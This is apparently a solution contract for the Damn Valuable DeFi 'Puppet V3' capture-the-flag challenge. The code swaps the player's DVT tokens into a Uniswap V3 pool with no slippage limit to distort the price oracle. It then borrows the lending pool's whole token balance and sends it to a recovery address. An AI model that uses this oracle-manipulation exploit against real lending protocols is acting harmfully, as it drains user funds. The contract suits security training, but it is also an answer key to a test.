pragma solidity =0.8.25;

import {ISwapRouter} from "../../lib/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";


contract Attack {
    ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    DamnValuableToken token;
    WETH weth;
    PuppetV3Pool puppetV3Pool;
    address recovery;

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;



    constructor(address _token, address _weth, address _recovery, address _puppetV3Pool) {
        token = DamnValuableToken(_token);
        weth = WETH(payable(_weth));
        recovery = _recovery;
        puppetV3Pool = PuppetV3Pool(_puppetV3Pool);

    }

    function swapDVTtoWETH() public {
        token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
            address(token),
            address(weth),
            3000,                           // fee
            address(this),                  // recipient    
            block.timestamp,                // deadline
            PLAYER_INITIAL_TOKEN_BALANCE,   // amountIn
            0,                              // amountOutMinimum
            0                               // sqrtPriceLimitX96, TickMath.MAX_SQRT_RATIO - 1 == 0(가격 허용 범위를 끝까지 올림=>tick이 최대까지 밀림)
        );

        swapRouter.exactInputSingle(params);

    }

    function drain() public {
        weth.approve(address(puppetV3Pool), type(uint256).max);
        puppetV3Pool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }


}